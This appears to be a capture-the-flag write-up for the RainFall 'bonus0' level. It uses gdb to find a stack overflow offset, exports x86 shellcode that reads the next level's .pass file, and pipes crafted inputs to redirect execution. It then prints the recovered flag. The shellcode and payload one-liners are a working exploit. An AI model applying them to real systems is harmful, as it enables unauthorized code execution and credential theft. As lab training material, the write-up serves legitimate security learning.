Here, we have almost the same thing as the first levels. The only difference is that the program awaits for 2 inputs on the stdin.
First, we find where we can abuse the buffer overflow :
By giving 20 chars on the first input, we see that bytes 9-12 are address of the segfault.

```bash


bonus0@RainFall:~$ gdb -q bonus
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA    
 - 
BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF��� BBBBCCCCDDDDEEEEFFFF���

Program received signal SIGSEGV, Segmentation fault.
0x45444444 in ?? ()
```

So we just need to put a shellcode that will print us the `/home/user/bonus1/.pass` in an environment variable as done previously and give the address to this variable and it will print the flag :

So first we export our shellcode :

```bash
bonus0@RainFall:~$ export SHELLCODE=`python -c 'print("\x90" * 30 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/user/bonus1/.pass")'`

```

Then we find the address of our shellcode :
```bash
bonus0@RainFall:~$ gdb -q bonus0 
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/100x *environ
0xbffff7b2:	0x505f434c	0x52455041	0x5f72663d	0x552e5246
0xbffff7c2:	0x382d4654	0x5f434c00	0x52444441	0x3d535345
0xbffff7d2:	0x465f7266	0x54552e52	0x00382d46	0x4d5f434c
0xbffff7e2:	0x54454e4f	0x3d595241	0x465f7266	0x54552e52
0xbffff7f2:	0x00382d46	0x4c454853	0x444f434c	0x90903d45
0xbffff802:	0x90909090	0x90909090	0x90909090	0x90909090
```

Here `0xbfff802`.
And then we feed the two desired inputs like so :

```bash
{ python -c 'print("A" * 20)'; python -c 'print("B" * 9 + 3 * "\x02\xf8\xff\xbf")'; } | ./bonus0
```

>bonus0@RainFall:~$ { python -c 'print("A" * 20)'; python -c 'print("B" * 9 + 3 * "\x02\xf8\xff\xbf")'; } | ./bonus0
>AAAAAAAAAAAAAAAAAAAABBBBBBBBB����������� BBBBBBBBB�����������
>cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```bash
su bonus1
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

